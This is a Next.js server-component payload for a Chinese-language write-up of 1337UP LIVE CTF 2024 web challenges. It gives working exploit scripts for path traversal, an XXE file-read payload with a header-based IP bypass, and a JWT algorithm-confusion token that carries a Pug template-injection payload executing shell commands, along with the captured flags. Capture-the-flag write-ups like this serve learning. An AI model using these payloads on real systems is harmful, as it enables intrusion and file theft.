@@ -1,0 +1,162 @@
+1:"$Sreact.fragment"
+2:I[5224,["507","static/chunks/457b8330-3be30b04990478c7.js","330","static/chunks/d3ac728e-3328b046974259c3.js","589","static/chunks/589-9fde9febffa50a4d.js","707","static/chunks/707-62fdd1b6f2deb256.js","698","static/chunks/698-2aae93d980e9e01d.js","321","static/chunks/app/(posts)/%5B...slug%5D/page-2a7a8d2bf85b0317.js"],"default"]
+3:I[31698,["507","static/chunks/457b8330-3be30b04990478c7.js","500","static/chunks/500-e2a7ab501ac40f90.js","589","static/chunks/589-9fde9febffa50a4d.js","698","static/chunks/698-2aae93d980e9e01d.js","974","static/chunks/app/page-6bf0379b668d6b5a.js"],"PostMeta"]
+4:"$Sreact.suspense"
+5:I[21957,["507","static/chunks/457b8330-3be30b04990478c7.js","330","static/chunks/d3ac728e-3328b046974259c3.js","589","static/chunks/589-9fde9febffa50a4d.js","707","static/chunks/707-62fdd1b6f2deb256.js","698","static/chunks/698-2aae93d980e9e01d.js","321","static/chunks/app/(posts)/%5B...slug%5D/page-2a7a8d2bf85b0317.js"],"PreloadChunks"]
+6:I[45543,["507","static/chunks/457b8330-3be30b04990478c7.js","330","static/chunks/d3ac728e-3328b046974259c3.js","589","static/chunks/589-9fde9febffa50a4d.js","707","static/chunks/707-62fdd1b6f2deb256.js","698","static/chunks/698-2aae93d980e9e01d.js","321","static/chunks/app/(posts)/%5B...slug%5D/page-2a7a8d2bf85b0317.js"],"default"]
+7:I[63942,["507","static/chunks/457b8330-3be30b04990478c7.js","330","static/chunks/d3ac728e-3328b046974259c3.js","589","static/chunks/589-9fde9febffa50a4d.js","707","static/chunks/707-62fdd1b6f2deb256.js","698","static/chunks/698-2aae93d980e9e01d.js","321","static/chunks/app/(posts)/%5B...slug%5D/page-2a7a8d2bf85b0317.js"],"default"]
+1e:I[31698,["507","static/chunks/457b8330-3be30b04990478c7.js","500","static/chunks/500-e2a7ab501ac40f90.js","589","static/chunks/589-9fde9febffa50a4d.js","698","static/chunks/698-2aae93d980e9e01d.js","974","static/chunks/app/page-6bf0379b668d6b5a.js"],"LikeButton"]
+1f:I[90484,[],"OutletBoundary"]
+:HL["/_next/static/css/d11fb5a2813f7e78.css","style"]
+:HL["/_next/static/css/0befe080061721ab.css","style"]
+8:T43e,<span class="token keyword">import</span> requests
+
+<span class="token comment"># login with agent_1337, intel420</span>
+
+path <span class="token operator">=</span> <span class="token string">"/assets/images/../../topsecret_a9aedc6c39f654e55275ad8e65e316b3.php"</span>
+url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"https://pizzaparadise.ctf.intigriti.io/topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download=</span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string">"</span></span>
+resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+
+<span class="token comment"># $flag = 'INTIGRITI{70p_53cr37_m15510n_c0mpl373}';</span>
+0:{"rsc":["$","$1","c",{"children":[[["$","$L2",null,{}],false,["$","h1",null,{"className":"x-post-title","children":"1337UP LIVE CTF 2024 Writeup"}],["$","$L3",null,{"path":"/24d/wp-1337uplive-2024/"}],["$","$4",null,{"fallback":["$","p",null,{"children":"Loading component..."}],"children":[["$","$L5",null,{}],[["$","h2",null,{"className":"x-h1","children":"Web"}],["$","h3",null,{"className":"x-h2","children":"Pizza Paradise"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"在<code class=\"x-inline-highlight\">robots.txt</code>中找到登录页面<code class=\"x-inline-highlight\">/secret_172346606e1d24062e891d537e917a90.html</code>，在JS中找到用户名和密码的哈希值；队友找到一个查弱口令的网站<a href=\"https://crackstation.net\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://crackstation.net</a>，查到密码是<code class=\"x-inline-highlight\">intel420</code>，登录。"}}],["$","$L6",null,{"src":"fig1.jpg","width":"100%"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"登录后是下载图片的页面，有路径遍历漏洞。flag在页面的PHP源码中。"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-title","children":"Python"}],["$","$L7",null,{"className":"x-codeblock-header-copy","text":"import requests\n\n# login with agent_1337, intel420\n\npath = \"/assets/images/../../topsecret_a9aedc6c39f654e55275ad8e65e316b3.php\"\nurl = f\"https://pizzaparadise.ctf.intigriti.io/topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download={path}\"\nresp = requests.get(url)\nprint(resp.text)\n\n# $flag = 'INTIGRITI{70p_53cr37_m15510n_c0mpl373}';\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$8"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"BioCrop"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"给了源码，需要绕过对IP的检测（服务端用了自定义的HTTP头），然后是XXE（XML外部实体注入）。"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-title","children":"Python"}],["$","$L7",null,{"className":"x-codeblock-header-copy","text":"import requests\n\nurl = \"https://biocorp.ctf.intigriti.io/panel.php\"\nxml = \"\"\"\n<!DOCTYPE root [\n<!ENTITY fileContents SYSTEM \"file:///../flag.txt\">\n]>\n<root>\n<temperature>&fileContents;</temperature>\n<pressure>77</pressure>\n<control_rods>77</control_rods>\n</root>\n\"\"\"\nresp = requests.post(url, headers={\"X-BIOCORP-VPN\": \"80.187.61.102\", \"Content-Type\": \"application/xml\"}, data=xml)\nprint(resp.text)\n\n# Temperature: INTIGRITI{c4r3ful_w17h_7h053_c0n7r0l5_0r_7h3r3_w1ll_b3_4_m3l7d0wn} °C\n"}]]}],"$L9"]}],"$La","$Lb","$Lc","$Ld","$Le","$Lf","$L10","$L11","$L12","$L13","$L14"]]}],"$L15"],["$L16","$L17"],"$L18"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"4HMjQRkkbw0xsQIttcbAw"}
+19:T601,<span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"https://biocorp.ctf.intigriti.io/panel.php"</span>
+xml <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
+&lt;!DOCTYPE root [
+&lt;!ENTITY fileContents SYSTEM "file:///../flag.txt">
+]>
+&lt;root>
+&lt;temperature>&amp;fileContents;&lt;/temperature>
+&lt;pressure>77&lt;/pressure>
+&lt;control_rods>77&lt;/control_rods>
+&lt;/root>
+"""</span>
+resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"X-BIOCORP-VPN"</span><span class="token punctuation">:</span> <span class="token string">"80.187.61.102"</span><span class="token punctuation">,</span> <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/xml"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> data<span class="token operator">=</span>xml<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+
+<span class="token comment"># Temperature: INTIGRITI{c4r3ful_w17h_7h053_c0n7r0l5_0r_7h3r3_w1ll_b3_4_m3l7d0wn} °C</span>
+9:["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$19"}}]}]
+a:["$","h3",null,{"className":"x-h2","children":"Cat Club"}]
+b:["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"JWT算法混淆+Pug模板引擎的SSTI。"}}]
+c:["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"注册登录后<code class=\"x-inline-highlight\">/cats</code>页面会显示用户的用户名，审计后发现存在SSTI："}}]
+d:["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-title","children":"JavaScript"}],["$","$L7",null,{"className":"x-codeblock-header-copy","text":"if (typeof req.user != \"undefined\") {\n    template = template.replace(/guest/g, req.user);\n}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> req<span class=\"token punctuation\">.</span>user <span class=\"token operator\">!=</span> <span class=\"token string\">\"undefined\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    template <span class=\"token operator\">=</span> template<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">guest</span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">g</span></span><span class=\"token punctuation\">,</span> req<span class=\"token punctuation\">.</span>user<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n"}}]}]]}]
+e:["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"但是常规手段注册不允许出现非数字和字母的字符，考虑直接构造用户名为payload的JWT<code class=\"x-inline-highlight\">token</code>。"}}]
+f:["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">/jwks.json</code>接口泄露了<code class=\"x-inline-highlight\">publicKey</code>，并且服务端检验JWT的函数是："}}]
+1a:T1b15,<span class="token keyword">function</span> <span class="token function">signJWT</span><span class="token punctuation">(</span><span class="token parameter">payload</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+        jwt<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>privateKey<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> <span class="token string">"RS256"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> token</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">return</span> <span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Error encoding token"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token function">resolve</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">function</span> <span class="token function">verifyJWT</span><span class="token punctuation">(</span><span class="token parameter">token</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>token <span class="token operator">||</span> <span class="token keyword">typeof</span> token <span class="token operator">!==</span> <span class="token string">"string"</span> <span class="token operator">||</span> token<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">!==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Invalid token format"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        jwt<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>publicKey<span class="token punctuation">,</span> token<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> header</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">return</span> <span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Invalid or expired token"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>header<span class="token punctuation">.</span>alg<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"none"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">return</span> <span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Algorithm 'none' is not allowed"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token function">resolve</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+10:["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-title","children":"JavaScript"}],["$","$L7",null,{"className":"x-codeblock-header-copy","text":"function signJWT(payload) {\n    return new Promise((resolve, reject) => {\n        jwt.encode(privateKey, payload, \"RS256\", (err, token) => {\n            if (err) {\n                return reject(new Error(\"Error encoding token\"));\n            }\n            resolve(token);\n        });\n    });\n}\n\nfunction verifyJWT(token) {\n    return new Promise((resolve, reject) => {\n        if (!token || typeof token !== \"string\" || token.split(\".\").length !== 3) {\n            return reject(new Error(\"Invalid token format\"));\n        }\n\n        jwt.decode(publicKey, token, (err, payload, header) => {\n            if (err) {\n                return reject(new Error(\"Invalid or expired token\"));\n            }\n\n            if (header.alg.toLowerCase() === \"none\") {\n                return reject(new Error(\"Algorithm 'none' is not allowed\"));\n            }\n\n            resolve(payload);\n        });\n    });\n}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$1a"}}]}]]}]
+11:["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"RSA的私钥无法拿到，但上述校验存在算法混淆漏洞，可以自己用<code class=\"x-inline-highlight\">publicKey</code>和HS256算法做一个签名，此时服务端校验的逻辑仍然是使用<code class=\"x-inline-highlight\">publicKey</code>验证，而算法已经被指定为HS256，于是可以通过。生成<code class=\"x-inline-highlight\">token</code>的代码是："}}]
+1b:T4f6,const fs = require("fs");
+const jwt = require("json-web-token");
+const jwkToPem = require("jwk-to-pem");
+
+// const publicKey = fs.readFileSync("public_key.pem", "utf8");
+
+const publicKey = jwkToPem({
+    "kty": "RSA",
+    "n": "w4oPEx-448XQWH_OtSWN8L0NUDU-rv1jMiL0s4clcuyVYvgpSV7FsvAG65EnEhXaYpYeMf1GMmUxBcyQOpathL1zf3_Jk5IsbhEmuUZ28Ccd8l2gOcURVFA3j4qMt34OlPqzf9nXBvljntTuZcQzYcGEtM7Sd9sSmg8uVx8f1WOmUFCaqtC26HdjBMnNfhnLKY9iPxFPGcE8qa8SsrnRfT5HJjSRu_JmGlYCrFSof5p_E0WPyCUbAV5rfgTm2CewF7vIP1neI5jwlcm22X2t8opUrLbrJYoWFeYZOY_Wr9vZb23xmmgo98OAc5icsvzqYODQLCxw4h9IxGEmMZ-Hdw",
+    "e": "AQAB",
+    "alg": "RS256",
+    "use": "sig"
+});
+
+function signJWT(payload) {
+    return new Promise((resolve, reject) => {
+        jwt.encode(publicKey, payload, "HS256", (err, token) => {
+            if (err) {
+                return reject(new Error("Error encoding token"));
+            }
+            resolve(token);
+        });
+    });
+}
+
+signJWT({
+    // username: "#{global.process.mainModule.constructor._load('child_process').execSync('ls /').toString()}"
+    username: "#{global.process.mainModule.constructor._load('child_process').execSync('cat /flag_Gx4wVbEc1fxN9ztM.txt').toString()}"
+}).then(token => {
+    console.log(token);
+    fs.writeFileSync("token.txt", token);
+});
+1c:T18ee,<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"json-web-token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> jwkToPem <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"jwk-to-pem"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// const publicKey = fs.readFileSync("public_key.pem", "utf8");</span>
+
+<span class="token keyword">const</span> publicKey <span class="token operator">=</span> <span class="token function">jwkToPem</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+    <span class="token string-property property">"kty"</span><span class="token operator">:</span> <span class="token string">"RSA"</span><span class="token punctuation">,</span>
+    <span class="token string-property property">"n"</span><span class="token operator">:</span> <span class="token string">"w4oPEx-448XQWH_OtSWN8L0NUDU-rv1jMiL0s4clcuyVYvgpSV7FsvAG65EnEhXaYpYeMf1GMmUxBcyQOpathL1zf3_Jk5IsbhEmuUZ28Ccd8l2gOcURVFA3j4qMt34OlPqzf9nXBvljntTuZcQzYcGEtM7Sd9sSmg8uVx8f1WOmUFCaqtC26HdjBMnNfhnLKY9iPxFPGcE8qa8SsrnRfT5HJjSRu_JmGlYCrFSof5p_E0WPyCUbAV5rfgTm2CewF7vIP1neI5jwlcm22X2t8opUrLbrJYoWFeYZOY_Wr9vZb23xmmgo98OAc5icsvzqYODQLCxw4h9IxGEmMZ-Hdw"</span><span class="token punctuation">,</span>
+    <span class="token string-property property">"e"</span><span class="token operator">:</span> <span class="token string">"AQAB"</span><span class="token punctuation">,</span>
+    <span class="token string-property property">"alg"</span><span class="token operator">:</span> <span class="token string">"RS256"</span><span class="token punctuation">,</span>
+    <span class="token string-property property">"use"</span><span class="token operator">:</span> <span class="token string">"sig"</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">function</span> <span class="token function">signJWT</span><span class="token punctuation">(</span><span class="token parameter">payload</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+        jwt<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>publicKey<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> <span class="token string">"HS256"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> token</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">return</span> <span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Error encoding token"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token function">resolve</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token function">signJWT</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+    <span class="token comment">// username: "#{global.process.mainModule.constructor._load('child_process').execSync('ls /').toString()}"</span>
+    <span class="token literal-property property">username</span><span class="token operator">:</span> <span class="token string">"#{global.process.mainModule.constructor._load('child_process').execSync('cat /flag_Gx4wVbEc1fxN9ztM.txt').toString()}"</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">token</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token string">"token.txt"</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+12:["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-title","children":"JavaScript"}],["$","$L7",null,{"className":"x-codeblock-header-copy","text":"$1b"}]]}],["$","pre",null,{"style":{"background":"linear-gradient(180deg, transparent 408px, var(--bg-transparent-golden) 408px 432px, transparent 432px)"},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$1c"}}]}]]}]
+13:["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"攻击："}}]
+1d:T799,<span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"https://catclub-2.ctf.intigriti.io/cats"</span></span>
+
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"catclub_exp/token.txt"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    token <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
+resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"token"</span><span class="token punctuation">:</span> token<span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+<span class="token comment"># print(resp.text)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'alt="Club Logo">&lt;/nav>&lt;/header>&lt;div class="content">&lt;h1>'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+<span class="token comment"># Welcome to the Cat Gallery, INTIGRITI{h3y_y0u_c4n7_ch41n_7h053_vuln5_l1k3_7h47}!&lt;/h1> ...</span>
+14:["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-title","children":"Python"}],["$","$L7",null,{"className":"x-codeblock-header-copy","text":"import requests\n\nurl = f\"https://catclub-2.ctf.intigriti.io/cats\"\n\nwith open(\"catclub_exp/token.txt\") as f:\n    token = f.read().strip()\nresp = requests.get(url, cookies={\"token\": token})\n\n# print(resp.text)\nprint(resp.text.split('alt=\"Club Logo\"></nav></header><div class=\"content\"><h1>')[1])\n\n# Welcome to the Cat Gallery, INTIGRITI{h3y_y0u_c4n7_ch41n_7h053_vuln5_l1k3_7h47}!</h1> ...\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$1d"}}]}]]}]
+15:["$","$L1e",null,{"path":"/24d/wp-1337uplive-2024/"}]
+16:["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/d11fb5a2813f7e78.css","precedence":"next"}]
+17:["$","link","1",{"rel":"stylesheet","href":"/_next/static/css/0befe080061721ab.css","precedence":"next"}]
+18:["$","$L1f",null,{"children":["$","$4",null,{"name":"Next.MetadataOutlet","children":"$@20"}]}]
+20:null
